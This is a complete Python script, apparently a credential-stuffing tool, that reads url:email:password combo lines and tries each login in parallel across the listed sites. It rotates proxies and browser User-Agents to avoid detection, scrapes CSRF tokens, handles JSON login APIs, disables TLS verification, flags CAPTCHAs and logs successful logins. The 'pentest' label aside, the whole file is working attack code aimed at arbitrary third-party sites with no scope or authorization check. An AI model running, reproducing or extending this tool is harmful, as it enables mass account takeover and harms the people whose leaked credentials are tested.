import requests
import concurrent.futures
import itertools
from bs4 import BeautifulSoup
import argparse
import time
import json
import logging
from logging.handlers import RotatingFileHandler
import socket
import ssl
import urllib3
import random
from urllib.parse import urlparse

# Make sure to install required libraries if you haven't already:
# pip install requests beautifulsoup4 urllib3

# Allow legacy SSL (optional; lowers security)
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Logging setup with rotation
handler = RotatingFileHandler("login_tester.log", maxBytes=5_000_000, backupCount=3)
logging.basicConfig(handlers=[handler], level=logging.INFO, format='%(asctime)s - %(message)s')

# Default configuration - can be overridden via CLI
DEFAULT_USERNAME_FIELD = "email"
DEFAULT_PASSWORD_FIELD = "password"
CSRF_TOKEN_FIELD = "csrf_token"
SUCCESS_INDICATOR = "Welcome"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (PentestBot)"
}

proxy_cycle = None  # Global proxy iterator

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
]

def load_proxies(proxy_file):
    with open(proxy_file, "r") as f:
        proxies = [line.strip() for line in f if line.strip()]
    return proxies

def get_next_proxy():
    global proxy_cycle
    try:
        return next(proxy_cycle) if proxy_cycle else None
    except StopIteration:
        return None

def domain_resolves(url):
    try:
        parsed = urlparse(url if url.startswith("http") else f"https://{url}")
        domain = parsed.hostname
        if not domain:
            return False
        socket.gethostbyname(domain)
        return True
    except Exception:
        return False

def is_site_up(url):
    try:
        resp = requests.get(url, headers=HEADERS, timeout=10, verify=False)
        return resp.status_code in range(200, 500)
    except Exception as e:
        logging.warning(f"[SITE CHECK] Failed for {url} - {e}")
        return False

def detect_possible_csrf_field(html_text):
    soup = BeautifulSoup(html_text, "html.parser")
    inputs = soup.find_all("input", {"type": "hidden"})
    for inp in inputs:
        if 'token' in inp.get('name', '').lower():
            return inp.get('name')
    return None

def get_csrf_token(session, url):
    try:
        resp = session.get(url, headers=HEADERS, timeout=30, verify=False)
        if resp.status_code != 200:
            return None, None
        soup = BeautifulSoup(resp.text, "html.parser")
        token_field = detect_possible_csrf_field(resp.text) or CSRF_TOKEN_FIELD
        token_input = soup.find("input", {"name": token_field})
        token_value = token_input.get("value") if token_input else None
        return token_field, token_value
    except Exception as e:
        logging.warning(f"Error fetching CSRF token from {url}: {e}")
        return None, None

def detect_captcha(response_text):
    indicators = ["captcha", "recaptcha", "g-recaptcha", "hcaptcha", "please verify", "are you human"]
    text = response_text.lower()
    return any(indicator in text for indicator in indicators)

def test_credential(line):
    time.sleep(1.5)
    raw_parts = line.strip().rsplit(":", 2)
    parts = [p.strip().strip("'").strip('"') for p in raw_parts if p.strip()]
    if len(parts) != 3:
        return f"[SKIP] Invalid format: {line}"

    url, email, password = parts

    if not url.lower().startswith("http"):
        url = "https://" + url

    if not domain_resolves(url):
        return f"[SKIP] Unresolvable domain in URL: {url}"

    if not is_site_up(url):
        return f"[SKIP] Site appears down: {url}"

    session = requests.Session()
    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})

    proxy = get_next_proxy()
    if proxy:
        logging.info(f"Using proxy: {proxy}")
    proxies = {"http": proxy, "https": proxy} if proxy else None

    is_json_api = url.endswith("/api/login") or "/api/" in url
    csrf_field, csrf_token = get_csrf_token(session, url) if not is_json_api else (None, None)

    try:
        if is_json_api:
            login_data = {"email": email, "password": password}
            headers = session.headers.copy()
            headers["Content-Type"] = "application/json"
            response = session.post(url, json=login_data, headers=headers, timeout=60, proxies=proxies, verify=False)
        else:
            login_data = {
                DEFAULT_USERNAME_FIELD: email,
                DEFAULT_PASSWORD_FIELD: password
            }
            if csrf_token:
                login_data[csrf_field] = csrf_token
            response = session.post(url, data=login_data, timeout=60, proxies=proxies, verify=False)

        if detect_captcha(response.text):
            return f"[CAPTCHA] CAPTCHA detected at {url} for {email}"

        if response.status_code == 200:
            try:
                data = response.json()
                if data.get("success") or data.get("authenticated"):
                    return f"[SUCCESS] {email}:{password} at {url}"
            except json.JSONDecodeError:
                pass
            if SUCCESS_INDICATOR.lower() in response.text.lower():
                return f"[SUCCESS] {email}:{password} at {url}"

        return f"[FAIL] {email}:{password} at {url}"
    except requests.exceptions.ProxyError as e:
        logging.warning(f"[PROXY ERROR] Proxy failed at {url} - {e}")
        return f"[PROXY ERROR] {url} - {e}"
    except requests.RequestException as e:
        logging.error(f"[EXCEPTION TRACE] {repr(e)}", exc_info=True)
        return f"[ERROR] {url} - {e}"

def main(file_path, max_workers=10, proxy_file=None):
    global proxy_cycle
    if proxy_file:
        proxies = load_proxies(proxy_file)
        if proxies:
            proxy_cycle = itertools.cycle(proxies)
        else:
            proxy_cycle = None
    else:
        proxy_cycle = None

    with open(file_path, "r") as f:
        lines = f.readlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        results = executor.map(test_credential, lines)

    for result in results:
        print(result)
        logging.info(result)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Credential tester with proxy, CAPTCHA, CSRF, and JSON support")
    parser.add_argument("file", help="File with url:email:password per line")
    parser.add_argument("--workers", type=int, default=10)
    parser.add_argument("--proxy-file", help="Proxy list file (ip:port)")
    parser.add_argument("--username-field", default=DEFAULT_USERNAME_FIELD)
    parser.add_argument("--password-field", default=DEFAULT_PASSWORD_FIELD)
    parser.add_argument("--csrf-field", default=CSRF_TOKEN_FIELD)
    parser.add_argument("--success-indicator", default=SUCCESS_INDICATOR)
    args = parser.parse_args()

    # Apply overrides
    DEFAULT_USERNAME_FIELD = args.username_field
    DEFAULT_PASSWORD_FIELD = args.password_field
    CSRF_TOKEN_FIELD = args.csrf_field
    SUCCESS_INDICATOR = args.success_indicator

    main(args.file, args.workers, args.proxy_file)
